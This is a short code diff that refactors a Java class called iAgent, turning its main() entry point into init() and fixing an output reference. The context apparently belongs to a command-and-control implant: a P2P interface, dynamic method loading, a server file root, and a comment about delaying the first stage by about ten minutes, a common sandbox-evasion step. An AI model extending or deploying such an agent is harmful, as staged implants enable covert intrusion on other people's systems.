@@ -103,7 +103,7 @@ class nConfig
     };
 }
 
-public class iAgent
+class iAgent
 {
     //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java -d ..\server\fileroot
     static public String cookieData = "null";
@@ -121,7 +121,7 @@ public class iAgent
     static public P2PInterface ifaceP2P = null;
     static private security secInst = new security();
 
-    public static void main(String[] args) throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
+    public static void init() throws RemoteException, ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //add execution delay of 10 minutes +/- to 1st stage
         sessUUID = UUID.randomUUID().toString();
@@ -313,7 +313,7 @@ public class iAgent
                 
                 outObj.put("error",String.format("Unable to load method %s, exception follows: %s",methodName,methObj.get("error").toString()));
 
-                Main.output.add(outObj);
+                iAgent.output.add(outObj);
             }
             else
             {
